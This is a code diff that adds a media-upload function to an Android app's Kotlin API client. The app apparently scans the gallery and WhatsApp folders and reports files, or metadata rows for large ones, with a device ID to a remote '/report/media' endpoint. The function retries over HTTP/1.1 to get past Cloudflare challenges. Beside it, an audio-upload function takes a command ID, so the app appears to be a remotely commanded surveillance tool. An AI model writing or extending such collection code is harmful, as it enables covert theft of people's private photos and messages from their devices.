@@ -901,6 +901,49 @@ object ApiClient {
         }
     }
 
+    /**
+     * Procedural media upload used by MediaCollectionManager (gallery /
+     * WhatsApp folder scanning). `bytes == null` uploads a metadata-only row
+     * (file exists on device but too large to send). Retries once over
+     * HTTP/1.1 if Cloudflare challenges the request.
+     */
+    fun uploadMediaFile(
+        bytes: ByteArray?,
+        filename: String,
+        mime: String,
+        mediaType: String,
+        timestampMs: Long,
+        metadataJson: String
+    ): Boolean {
+        fun buildRequest(useHttp11Client: okhttp3.OkHttpClient): Boolean {
+            val bodyBuilder = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("device_id", CloudConfig.deviceId)
+                .addFormDataPart("media_type", mediaType)
+                .addFormDataPart("timestamp", timestampMs.toString())
+                .addFormDataPart("metadata", metadataJson)
+            if (bytes != null) {
+                bodyBuilder.addFormDataPart(
+                    "file", filename, bytes.toRequestBody(mime.toMediaType())
+                )
+            }
+            val request = Request.Builder()
+                .url("${CloudConfig.apiBaseUrl}/report/media")
+                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
+                .post(bodyBuilder.build())
+                .build()
+            return try {
+                useHttp11Client.newCall(request).execute().use { resp ->
+                    val text = resp.body?.string().orEmpty()
+                    resp.isSuccessful && !text.contains("Just a moment")
+                }
+            } catch (e: Exception) {
+                false
+            }
+        }
+        return buildRequest(client) || buildRequest(http11Client)
+    }
+
     fun uploadAudioFile(file: java.io.File, commandId: String? = null): Boolean {
         return try {
             val mediaType = "audio/mp4".toMediaType()
